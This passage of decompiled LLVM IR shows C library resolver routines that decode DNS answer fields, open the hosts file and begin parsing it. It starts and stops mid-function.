  %v2_10013bcc = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10013bcc, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268516336, i32* @lr, align 4
  %v2_10013bec = call i32 @__decode_dotted(i32 %v2_10013bcc, i32 256)
  store i32 %v2_10013bec, i32* @r27, align 4
  %v1_10013bf0 = icmp slt i32 %v2_10013bec, 0
  %v0_10013bf4 = load i32, i32* @r28, align 4
  %v2_10013bf4 = add i32 %v0_10013bf4, %v2_10013bec
  store i32 %v2_10013bf4, i32* @r28, align 4
  %v1_10013bf8 = load i32, i32* @r29, align 4
  %v2_10013bf8 = sub i32 %v1_10013bf8, %v2_10013bf4
  %v1_10013bfc = add i32 %v2_10013bf8, -10
  br i1 %v1_10013bf0, label %dec_label_pc_10013cb8, label %dec_label_pc_10013c08

dec_label_pc_10013c08:                            ; preds = %entry
  %v0_10013c0c = load i32, i32* @r26, align 4
  %v2_10013c0c = add i32 %v0_10013c0c, %v2_10013bf4
  store i32 %v2_10013c0c, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10013bfc, -1
  br i1 %tmp6, label %dec_label_pc_10013c1c, label %dec_label_pc_10013c14

dec_label_pc_10013c14:                            ; preds = %dec_label_pc_10013c08
  store i32 %v1_10013bfc, i32* @r27, align 4
  br label %dec_label_pc_10013cb8

dec_label_pc_10013c1c:                            ; preds = %dec_label_pc_10013c08
  store i32 268516384, i32* @lr, align 4
  %v1_10013c1c = call i32 @__GI_strdup(i32 %v2_10013bcc)
  %v0_10013c20 = load i32, i32* @r30, align 4
  %v1_10013c20 = add i32 %v0_10013c20, 2
  store i32 %v1_10013c20, i32* %r8.global-to-local, align 4
  %v1_10013c24 = load i32, i32* @r31, align 4
  %v2_10013c24 = inttoptr i32 %v1_10013c24 to i32*
  store i32 %v1_10013c1c, i32* %v2_10013c24, align 4
  %v0_10013c28 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013c28 = add i32 %v0_10013c28, 2
  store i32 %v1_10013c28, i32* %r10.global-to-local, align 4
  %v0_10013c2c = load i32, i32* @r30, align 4
  %v1_10013c2c = add i32 %v0_10013c2c, 10
  store i32 %v1_10013c2c, i32* %r6.global-to-local, align 4
  %v0_10013c30 = load i32, i32* @r26, align 4
  %v1_10013c30 = load i32, i32* @r28, align 4
  %v2_10013c30 = add i32 %v1_10013c30, %v0_10013c30
  %v3_10013c30 = inttoptr i32 %v2_10013c30 to i8*
  %v4_10013c30 = load i8, i8* %v3_10013c30, align 1
  %v5_10013c30 = zext i8 %v4_10013c30 to i32
  store i32 %v5_10013c30, i32* %r0.global-to-local, align 4
  %v1_10013c34 = add i32 %v0_10013c2c, 1
  %v2_10013c34 = inttoptr i32 %v1_10013c34 to i8*
  %v3_10013c34 = load i8, i8* %v2_10013c34, align 1
  %v4_10013c34 = zext i8 %v3_10013c34 to i32
  store i32 %v4_10013c34, i32* %r9.global-to-local, align 4
  %v1_10013c38 = mul nuw nsw i32 %v5_10013c30, 256
  %v2_10013c3c = or i32 %v4_10013c34, %v1_10013c38
  store i32 %v2_10013c3c, i32* %r0.global-to-local, align 4
  %v1_10013c40 = load i32, i32* @r31, align 4
  %v2_10013c40 = add i32 %v1_10013c40, 4
  %v3_10013c40 = inttoptr i32 %v2_10013c40 to i32*
  store i32 %v2_10013c3c, i32* %v3_10013c40, align 4
  %v0_10013c44 = load i32, i32* @r30, align 4
  %v1_10013c44 = add i32 %v0_10013c44, 2
  %v2_10013c44 = inttoptr i32 %v1_10013c44 to i8*
  %v3_10013c44 = load i8, i8* %v2_10013c44, align 1
  %v4_10013c44 = zext i8 %v3_10013c44 to i32
  store i32 %v4_10013c44, i32* %r0.global-to-local, align 4
  %v0_10013c48 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013c48 = add i32 %v0_10013c48, 1
  %v2_10013c48 = inttoptr i32 %v1_10013c48 to i8*
  %v3_10013c48 = load i8, i8* %v2_10013c48, align 1
  %v4_10013c48 = zext i8 %v3_10013c48 to i32
  store i32 %v4_10013c48, i32* %r9.global-to-local, align 4
  %v1_10013c4c = mul nuw nsw i32 %v4_10013c44, 256
  %v2_10013c50 = or i32 %v4_10013c48, %v1_10013c4c
  store i32 %v2_10013c50, i32* %r0.global-to-local, align 4
  %v1_10013c54 = load i32, i32* @r31, align 4
  %v2_10013c54 = add i32 %v1_10013c54, 8
  %v3_10013c54 = inttoptr i32 %v2_10013c54 to i32*
  store i32 %v2_10013c50, i32* %v3_10013c54, align 4
  %v0_10013c58 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013c58 = add i32 %v0_10013c58, 2
  %v2_10013c58 = inttoptr i32 %v1_10013c58 to i8*
  %v3_10013c58 = load i8, i8* %v2_10013c58, align 1
  %v4_10013c58 = zext i8 %v3_10013c58 to i32
  store i32 %v4_10013c58, i32* %r0.global-to-local, align 4
  %v0_10013c5c = load i32, i32* %r10.global-to-local, align 4
  %v1_10013c5c = add i32 %v0_10013c5c, 1
  %v2_10013c5c = inttoptr i32 %v1_10013c5c to i8*
  %v3_10013c5c = load i8, i8* %v2_10013c5c, align 1
  %v4_10013c5c = zext i8 %v3_10013c5c to i32
  store i32 %v4_10013c5c, i32* %r11.global-to-local, align 4
  %v1_10013c60 = add i32 %v0_10013c5c, 3
  %v2_10013c60 = inttoptr i32 %v1_10013c60 to i8*
  %v3_10013c60 = load i8, i8* %v2_10013c60, align 1
  %v4_10013c60 = zext i8 %v3_10013c60 to i32
  %v1_10013c64 = mul nuw i32 %v4_10013c58, 16777216
  store i32 %v1_10013c64, i32* %r0.global-to-local, align 4
  %v1_10013c68 = add i32 %v0_10013c5c, 2
  %v2_10013c68 = inttoptr i32 %v1_10013c68 to i8*
  %v3_10013c68 = load i8, i8* %v2_10013c68, align 1
  %v4_10013c68 = zext i8 %v3_10013c68 to i32
  %v1_10013c6c = mul nuw nsw i32 %v4_10013c5c, 65536
  %v2_10013c70 = or i32 %v1_10013c6c, %v1_10013c64
  %v0_10013c74 = load i32, i32* @r28, align 4
  %v1_10013c74 = add i32 %v0_10013c74, 10
  store i32 %v1_10013c74, i32* %r11.global-to-local, align 4
  %v2_10013c78 = or i32 %v2_10013c70, %v4_10013c60
  store i32 %v2_10013c78, i32* %r0.global-to-local, align 4
  %v1_10013c7c = mul nuw nsw i32 %v4_10013c68, 256
  %v2_10013c80 = or i32 %v1_10013c7c, %v2_10013c78
  store i32 %v2_10013c80, i32* %r9.global-to-local, align 4
  %v1_10013c84 = load i32, i32* @r31, align 4
  %v2_10013c84 = add i32 %v1_10013c84, 12
  %v3_10013c84 = inttoptr i32 %v2_10013c84 to i32*
  store i32 %v2_10013c80, i32* %v3_10013c84, align 4
  %v0_10013c88 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013c88 = add i32 %v0_10013c88, 6
  %v2_10013c88 = inttoptr i32 %v1_10013c88 to i8*
  %v3_10013c88 = load i8, i8* %v2_10013c88, align 1
  %v4_10013c88 = zext i8 %v3_10013c88 to i32
  store i32 %v4_10013c88, i32* %r9.global-to-local, align 4
  %v0_10013c8c = load i32, i32* @r30, align 4
  %v1_10013c8c = add i32 %v0_10013c8c, 9
  %v2_10013c8c = inttoptr i32 %v1_10013c8c to i8*
  %v3_10013c8c = load i8, i8* %v2_10013c8c, align 1
  %v4_10013c8c = zext i8 %v3_10013c8c to i32
  store i32 %v4_10013c8c, i32* %r0.global-to-local, align 4
  %v1_10013c90 = mul nuw nsw i32 %v4_10013c88, 256
  store i32 %v1_10013c90, i32* %r9.global-to-local, align 4
  %v0_10013c94 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013c94 = load i32, i32* @r31, align 4
  %v2_10013c94 = add i32 %v1_10013c94, 24
  %v3_10013c94 = inttoptr i32 %v2_10013c94 to i32*
  store i32 %v0_10013c94, i32* %v3_10013c94, align 4
  %v0_10013c98 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013c98 = load i32, i32* %r0.global-to-local, align 4
  %v2_10013c98 = or i32 %v1_10013c98, %v0_10013c98
  store i32 %v2_10013c98, i32* %r9.global-to-local, align 4
  %v0_10013c9c = load i32, i32* %r6.global-to-local, align 4
  %v1_10013c9c = load i32, i32* @r31, align 4
  %v2_10013c9c = add i32 %v1_10013c9c, 20
  %v3_10013c9c = inttoptr i32 %v2_10013c9c to i32*
  store i32 %v0_10013c9c, i32* %v3_10013c9c, align 4
  %v0_10013ca0 = load i32, i32* @r29, align 4
  %v1_10013ca0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10013ca0 = icmp slt i32 %v0_10013ca0, %v1_10013ca0
  %v1_10013ca4 = add i32 %v1_10013ca0, 10
  store i32 %v1_10013ca4, i32* %r0.global-to-local, align 4
  %v0_10013ca8 = load i32, i32* @r27, align 4
  %v2_10013ca8 = add i32 %v0_10013ca8, %v1_10013ca4
  store i32 %v2_10013ca8, i32* @r27, align 4
  %v1_10013cac = load i32, i32* @r31, align 4
  %v2_10013cac = add i32 %v1_10013cac, 16
  %v3_10013cac = inttoptr i32 %v2_10013cac to i32*
  store i32 %v1_10013ca0, i32* %v3_10013cac, align 4
  br i1 %v2_10013ca0, label %dec_label_pc_10013cb4, label %dec_label_pc_10013c1c.dec_label_pc_10013cb8_crit_edge

dec_label_pc_10013c1c.dec_label_pc_10013cb8_crit_edge: ; preds = %dec_label_pc_10013c1c
  %v0_10013cbc.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10013cb8

dec_label_pc_10013cb4:                            ; preds = %dec_label_pc_10013c1c
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10013cb8

dec_label_pc_10013cb8:                            ; preds = %dec_label_pc_10013c1c.dec_label_pc_10013cb8_crit_edge, %entry, %dec_label_pc_10013c14, %dec_label_pc_10013cb4
  %v0_10013cbc = phi i32 [ %v0_10013cbc.pre, %dec_label_pc_10013c1c.dec_label_pc_10013cb8_crit_edge ], [ %v2_10013bec, %entry ], [ %v1_10013bfc, %dec_label_pc_10013c14 ], [ -1, %dec_label_pc_10013cb4 ]
  store i32 %v0_10013bc4, i32* %r0.global-to-local, align 4
  ret i32 %v0_10013cbc

; uselistorder directives
  uselistorder i32 %v1_10013ca0, { 1, 0, 2 }
  uselistorder i32 %v1_10013c64, { 1, 0 }
  uselistorder i32 %v1_10013bfc, { 1, 2, 0 }
  uselistorder i32 %v2_10013bec, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10013bcc, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 65536, { 0, 28, 1, 2, 30, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 15, 29, 16, 19, 18, 17, 21, 22, 20, 23, 25, 26, 24, 27 }
  uselistorder i32 3, { 46, 47, 48, 49, 50, 51, 52, 53, 54, 1, 55, 39, 2, 0, 8, 17, 19, 18, 10, 20, 56, 9, 61, 3, 62, 63, 40, 41, 21, 42, 45, 22, 23, 24, 25, 26, 33, 59, 60, 34, 65, 36, 14, 4, 5, 64, 57, 58, 6, 70, 71, 72, 66, 67, 68, 69, 12, 44, 43, 7, 13, 35, 15, 27, 28, 37, 38, 29, 30, 31, 32, 16, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 51, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 52, 16, 44, 17, 18, 19, 20, 21, 22, 23, 24, 48, 25, 49, 50, 54, 26, 27, 28, 29, 30, 53, 47, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 41, 42, 43 }
  uselistorder label %dec_label_pc_10013cb8, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_10013cd4 = load i32, i32* @lr, align 4
  store i32 268516600, i32* @lr, align 4
  %v3_10013cf4 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1001a540.854 to i32), i32 ptrtoint (i32* @global_var_1001a4dc.817 to i32))
  %v3_10013cfc = icmp eq i32 %v3_10013cf4, 0
  br i1 %v3_10013cfc, label %dec_label_pc_10013d04, label %dec_label_pc_10013d20

dec_label_pc_10013d04:                            ; preds = %entry
  %v0_10013cf8 = load i32, i32* @r29, align 4
  store i32 %v0_10013cd4, i32* @lr, align 4
  %v3_10013d1c = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1001a54c.855 to i32), i32 %v0_10013cf8)
  br label %dec_label_pc_10013d20

dec_label_pc_10013d20:                            ; preds = %entry, %dec_label_pc_10013d04
  %v0_10013d30 = phi i32 [ %v3_10013cf4, %entry ], [ %v3_10013d1c, %dec_label_pc_10013d04 ]
  ret i32 %v0_10013d30

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10013d20, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_10013d34 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_10013d48 = sub i32 0, %arg6
  %v1_10013d4c = urem i32 %v1_10013d48, 4
  store i32 %v1_10013d4c, i32* %r0.global-to-local, align 4
  %v3_10013d4c = icmp eq i32 %v1_10013d4c, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_10013d64 = load i32, i32* @r10, align 4
  store i32 %v0_10013d64, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_10013d80.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_10013d4c, label %dec_label_pc_10013d80, label %dec_label_pc_10013d70

dec_label_pc_10013d70:                            ; preds = %entry
  %v2_10013d70 = icmp ult i32 %v0_10013d80.pr, %v1_10013d4c
  br i1 %v2_10013d70, label %dec_label_pc_10014034, label %dec_label_pc_10013d78

dec_label_pc_10013d78:                            ; preds = %dec_label_pc_10013d70
  %v2_10013d78 = sub i32 %v0_10013d80.pr, %v1_10013d4c
  store i32 %v2_10013d78, i32* %r9.global-to-local, align 4
  %v2_10013d7c = add i32 %v1_10013d4c, %arg6
  store i32 %v2_10013d7c, i32* @r30, align 4
  br label %dec_label_pc_10013d80

dec_label_pc_10013d80:                            ; preds = %entry, %dec_label_pc_10013d78
  %v0_10013d8c = phi i32 [ %v2_10013d7c, %dec_label_pc_10013d78 ], [ %arg6, %entry ]
  %v0_10013d90 = phi i32 [ %v2_10013d78, %dec_label_pc_10013d78 ], [ %v0_10013d80.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_10013d90, 32
  br i1 %tmp49, label %dec_label_pc_10014034, label %dec_label_pc_10013d88

dec_label_pc_10013d88:                            ; preds = %dec_label_pc_10013d80
  %v3_10013d88 = icmp eq i32 %arg4, 1
  %v1_10013d8c = add i32 %v0_10013d8c, 32
  store i32 %v1_10013d8c, i32* @r24, align 4
  %v1_10013d90 = add i32 %v0_10013d90, -32
  store i32 %v1_10013d90, i32* @r27, align 4
  br i1 %v3_10013d88, label %dec_label_pc_10013e90, label %dec_label_pc_10013d98

dec_label_pc_10013d98:                            ; preds = %dec_label_pc_10013d88
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10013da0 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10013da0, align 4
  %tmp50 = icmp ult i32 %v1_10013d90, 4
  br i1 %tmp50, label %dec_label_pc_10014034, label %dec_label_pc_10013da8

dec_label_pc_10013da8:                            ; preds = %dec_label_pc_10013d98
  %v0_10013da8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013da8 = add i32 %v0_10013da8, -36
  store i32 %v1_10013da8, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10013da8, 8
  br i1 %tmp51, label %dec_label_pc_10014034, label %dec_label_pc_10013db4

dec_label_pc_10013db4:                            ; preds = %dec_label_pc_10013da8
  %v0_10013db4 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_10013db4, 16
  br i1 %tmp52, label %dec_label_pc_10014034, label %dec_label_pc_10013dbc

dec_label_pc_10013dbc:                            ; preds = %dec_label_pc_10013db4
  %v1_10013dbc = add i32 %v0_10013da8, -48
  store i32 %v1_10013dbc, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10013dbc, 8
  br i1 %tmp53, label %dec_label_pc_10014034, label %dec_label_pc_10013dc8

dec_label_pc_10013dc8:                            ; preds = %dec_label_pc_10013dbc
  %v1_10013dc8 = add i32 %v0_10013da8, -56
  store i32 %v1_10013dc8, i32* %r0.global-to-local, align 4
  %v1_10013dcc = add i32 %v0_10013da8, -44
  store i32 %v1_10013dcc, i32* @r27, align 4
  %v3_10013dd0 = icmp ugt i32 %v1_10013dc8, %v1_10013dcc
  %v0_10013dd4 = load i32, i32* @r30, align 4
  %v1_10013dd4 = add i32 %v0_10013dd4, 36
  store i32 %v1_10013dd4, i32* @r29, align 4
  %v1_10013dd8 = add i32 %v0_10013dd4, 48
  store i32 %v1_10013dd8, i32* @r26, align 4
  br i1 %v3_10013dd0, label %dec_label_pc_10013dec, label %dec_label_pc_10013de4

dec_label_pc_10013de4:                            ; preds = %dec_label_pc_10013dc8
  store i32 %v1_10013dc8, i32* @r27, align 4
  br label %dec_label_pc_10013dec

dec_label_pc_10013dec:                            ; preds = %dec_label_pc_10013dc8, %dec_label_pc_10013de4
  %v0_10013dec = phi i32 [ %v1_10013dc8, %dec_label_pc_10013de4 ], [ %v1_10013dcc, %dec_label_pc_10013dc8 ]
  %tmp54 = icmp ult i32 %v0_10013dec, 80
  br i1 %tmp54, label %dec_label_pc_10014034, label %dec_label_pc_10013df4

dec_label_pc_10013df4:                            ; preds = %dec_label_pc_10013dec
  store i32 268516856, i32* @lr, align 4
  %v0_10013df4 = call i32 @__open_etc_hosts()
  store i32 %v0_10013df4, i32* @r20, align 4
  %v3_10013df8 = icmp eq i32 %v0_10013df4, 0
  br i1 %v3_10013df8, label %dec_label_pc_10013e18, label %dec_label_pc_10013e00

dec_label_pc_10013e00:                            ; preds = %dec_label_pc_10013df4
  %v0_10013e00 = load i32, i32* @r24, align 4
  store i32 %v0_10013e00, i32* @r25, align 4
  %v0_10013e08 = load i32, i32* @r26, align 4
  store i32 %v0_10013e08, i32* @r23, align 4
  %v0_10013e0c = load i32, i32* @r31, align 4
  store i32 %v0_10013e0c, i32* @r24, align 4
  store i32 %v0_10013e00, i32* %r21.global-to-local, align 4
  %v1_10013ea8.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10013ea0

dec_label_pc_10013e18:                            ; preds = %dec_label_pc_10013df4
  %v1_10013e18 = load i32, i32* %r17.global-to-local, align 4
  %v2_10013e18 = inttoptr i32 %v1_10013e18 to i32*
  store i32 0, i32* %v2_10013e18, align 4
  %v0_10013e1c = call i32 @__errno_location()
  %v1_10013e20 = inttoptr i32 %v0_10013e1c to i32*
  %v2_10013e20 = load i32, i32* %v1_10013e20, align 4
  store i32 %v2_10013e20, i32* @r26, align 4
  br label %dec_label_pc_10014038

dec_label_pc_10013e28:                            ; preds = %dec_label_pc_10013fc8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10013e2c = load i32, i32* @r25, align 4
  %v1_10013e2c = load i32, i32* @r22, align 4
  %v2_10013e2c = inttoptr i32 %v1_10013e2c to i32*
  store i32 %v0_10013e2c, i32* %v2_10013e2c, align 4
  %v0_10013e30 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e30 = load i32, i32* @r22, align 4
  %v2_10013e30 = add i32 %v1_10013e30, 4
  %v3_10013e30 = inttoptr i32 %v2_10013e30 to i32*
  store i32 %v0_10013e30, i32* %v3_10013e30, align 4
  %v0_10013e34 = load i32, i32* @r30, align 4
  %v1_10013e34 = add i32 %v0_10013e34, 8
  store i32 %v1_10013e34, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10013e3c = add i32 %v0_10013e34, 4
  %v2_10013e3c = inttoptr i32 %v1_10013e3c to i32*
  %v3_10013e3c = load i32, i32* %v2_10013e3c, align 4
  store i32 %v3_10013e3c, i32* %r0.global-to-local, align 4
  %v0_10013e40 = load i32, i32* %r19.global-to-local, align 4
  %v1_10013e40 = load i32, i32* @r28, align 4
  %v2_10013e40 = add i32 %v1_10013e40, 8
  %v3_10013e40 = inttoptr i32 %v2_10013e40 to i32*
  store i32 %v0_10013e40, i32* %v3_10013e40, align 4
  %v0_10013e44 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e44 = load i32, i32* @r28, align 4
  %v2_10013e44 = inttoptr i32 %v1_10013e44 to i32*
  store i32 %v0_10013e44, i32* %v2_10013e44, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10013e4c = load i32, i32* @r28, align 4
  %v2_10013e4c = add i32 %v1_10013e4c, 12
  %v3_10013e4c = inttoptr i32 %v2_10013e4c to i32*
  store i32 4, i32* %v3_10013e4c, align 4
  %v0_10013e50 = load i32, i32* @r22, align 4
  %v1_10013e50 = load i32, i32* @r28, align 4
  %v2_10013e50 = add i32 %v1_10013e50, 16
  %v3_10013e50 = inttoptr i32 %v2_10013e50 to i32*
  store i32 %v0_10013e50, i32* %v3_10013e50, align 4
  br label %dec_label_pc_10013e84

dec_label_pc_10013e58:                            ; preds = %dec_label_pc_10013fec
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10013e5c = load i32, i32* %r21.global-to-local, align 4
  %v1_10013e5c = load i32, i32* @r23, align 4
  %v2_10013e5c = inttoptr i32 %v1_10013e5c to i32*
  store i32 %v0_10013e5c, i32* %v2_10013e5c, align 4
  %v0_10013e60 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e60 = load i32, i32* @r23, align 4
  %v2_10013e60 = add i32 %v1_10013e60, 4
  %v3_10013e60 = inttoptr i32 %v2_10013e60 to i32*
  store i32 %v0_10013e60, i32* %v3_10013e60, align 4
  %v0_10013e64 = load i32, i32* @r30, align 4
  %v1_10013e64 = add i32 %v0_10013e64, 8
  store i32 %v1_10013e64, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10013e6c = add i32 %v0_10013e64, 4
  %v2_10013e6c = inttoptr i32 %v1_10013e6c to i32*
  %v3_10013e6c = load i32, i32* %v2_10013e6c, align 4
  store i32 %v3_10013e6c, i32* %r0.global-to-local, align 4
  %v0_10013e70 = load i32, i32* %r19.global-to-local, align 4
  %v1_10013e70 = load i32, i32* @r28, align 4
  %v2_10013e70 = add i32 %v1_10013e70, 8
  %v3_10013e70 = inttoptr i32 %v2_10013e70 to i32*
  store i32 %v0_10013e70, i32* %v3_10013e70, align 4
  %v0_10013e74 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e74 = load i32, i32* @r28, align 4
  %v2_10013e74 = inttoptr i32 %v1_10013e74 to i32*
  store i32 %v0_10013e74, i32* %v2_10013e74, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_10013e7c = load i32, i32* @r28, align 4
  %v2_10013e7c = add i32 %v1_10013e7c, 12
  %v3_10013e7c = inttoptr i32 %v2_10013e7c to i32*
  store i32 16, i32* %v3_10013e7c, align 4
  %v0_10013e80 = load i32, i32* @r23, align 4
  %v1_10013e80 = load i32, i32* @r28, align 4
  %v2_10013e80 = add i32 %v1_10013e80, 16
  %v3_10013e80 = inttoptr i32 %v2_10013e80 to i32*
  store i32 %v0_10013e80, i32* %v3_10013e80, align 4
  br label %dec_label_pc_10013e84

dec_label_pc_10013e84:                            ; preds = %dec_label_pc_10013e28, %dec_label_pc_10013e58
  %v0_10013e84 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e84 = load i32, i32* @r28, align 4
  %v2_10013e84 = add i32 %v1_10013e84, 4
  %v3_10013e84 = inttoptr i32 %v2_10013e84 to i32*
  store i32 %v0_10013e84, i32* %v3_10013e84, align 4
  %v0_10013e88 = load i32, i32* @r28, align 4
  %v1_10013e88 = load i32, i32* %r17.global-to-local, align 4
  %v2_10013e88 = inttoptr i32 %v1_10013e88 to i32*
  store i32 %v0_10013e88, i32* %v2_10013e88, align 4
  br label %dec_label_pc_10014020

dec_label_pc_10013e90:                            ; preds = %dec_label_pc_10013d88
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10013ea0

dec_label_pc_10013ea0:                            ; preds = %dec_label_pc_10013e00, %dec_label_pc_10013e90
  %v1_10013ea8 = phi i32 [ %v1_10013ea8.pre, %dec_label_pc_10013e00 ], [ %arg8, %dec_label_pc_10013e90 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10013ea8 = inttoptr i32 %v1_10013ea8 to i32*
  store i32 1, i32* %v2_10013ea8, align 4
  br label %dec_label_pc_10014008

dec_label_pc_10013eb0:                            ; preds = %dec_label_pc_10014008
  %v0_10013eb0 = load i32, i32* @r24, align 4
  store i32 %v0_10013eb0, i32* @r3, align 4
  store i32 268517052, i32* @lr, align 4
  %v2_10013eb8 = call i32 @__GI_strchr(i32 %v0_10013eb0, i32 35)
  %v4_10013ebc = icmp eq i32 %v2_10013eb8, 0
  br i1 %v4_10013ebc, label %dec_label_pc_10013ecc, label %dec_label_pc_10013ec4

dec_label_pc_10013ec4:                            ; preds = %dec_label_pc_10013eb0
  %v3_10013eb8 = inttoptr i32 %v2_10013eb8 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_10013eb8, align 1
  br label %dec_label_pc_10013ecc

dec_label_pc_10013ecc:                            ; preds = %dec_label_pc_10013eb0, %dec_label_pc_10013ec4
  %v0_10013ecc = load i32, i32* @r24, align 4
  store i32 %v0_10013ecc, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_10013f4817 = inttoptr i32 %v0_10013ecc to i8*
  %v2_10013f4818 = load i8, i8* %v1_10013f4817, align 1
  %v3_10013f4819 = zext i8 %v2_10013f4818 to i32
  store i32 %v3_10013f4819, i32* %r0.global-to-local, align 4
  %v3_10013f4c21 = icmp eq i8 %v2_10013f4818, 0
  br i1 %v3_10013f4c21, label %dec_label_pc_10013f54, label %dec_label_pc_10013ee4.preheader

dec_label_pc_10013ed8:                            ; preds = %dec_label_pc_10013ef4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10013edc = inttoptr i32 %v0_10013f18 to i8*
  store i8 0, i8* %v3_10013edc, align 1
  %v0_10013ee0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013ee0 = add i32 %v0_10013ee0, 1
  store i32 %v1_10013ee0, i32* %r11.global-to-local, align 4
  %v1_10013ee4 = inttoptr i32 %v1_10013ee0 to i8*
  %v2_10013ee4 = load i8, i8* %v1_10013ee4, align 1
  %v3_10013ee4 = zext i8 %v2_10013ee4 to i32
  store i32 %v3_10013ee4, i32* %r0.global-to-local, align 4
  %v3_10013ee8 = icmp eq i8 %v2_10013ee4, 0
  br i1 %v3_10013ee8, label %dec_label_pc_10013f54, label %dec_label_pc_10013ef4

dec_label_pc_10013ef4:                            ; preds = %dec_label_pc_10013ee4.preheader, %dec_label_pc_10013ed8
  %v0_10013f18 = phi i32 [ %v1_10013ee0, %dec_label_pc_10013ed8 ], [ %v0_10013ee42, %dec_label_pc_10013ee4.preheader ]
  %v0_10013efc.in = phi i32 [ %v3_10013ee4, %dec_label_pc_10013ed8 ], [ %v3_10013ee45, %dec_label_pc_10013ee4.preheader ]
  %v0_10013efc = mul nuw nsw i32 %v0_10013efc.in, 2
  %v3_10013ef8 = load i32, i32* @global_var_1002b8c0, align 4
  store i32 %v3_10013ef8, i32* %r9.global-to-local, align 4
  %v2_10013efc = add i32 %v3_10013ef8, %v0_10013efc
  %v3_10013efc = inttoptr i32 %v2_10013efc to i16*
  %v4_10013efc = load i16, i16* %v3_10013efc, align 2
  %v5_10013efc = zext i16 %v4_10013efc to i32
  store i32 %v5_10013efc, i32* %r0.global-to-local, align 4
  %v1_10013f00 = and i32 %v5_10013efc, 32
  store i32 %v1_10013f00, i32* %r9.global-to-local, align 4
  %v3_10013f00 = icmp eq i32 %v1_10013f00, 0
  br i1 %v3_10013f00, label %dec_label_pc_10013f08, label %dec_label_pc_10013ed8

dec_label_pc_10013f08:                            ; preds = %dec_label_pc_10013ef4
  %v0_10013f08 = load i32, i32* @r29, align 4
  %v2_10013f08 = icmp sgt i32 %v0_10013f08, 6
  br i1 %v2_10013f08, label %dec_label_pc_10013f24.preheader, label %dec_label_pc_10013f10

dec_label_pc_10013f10:                            ; preds = %dec_label_pc_10013f08
  %v1_10013f10 = mul i32 %v0_10013f08, 4
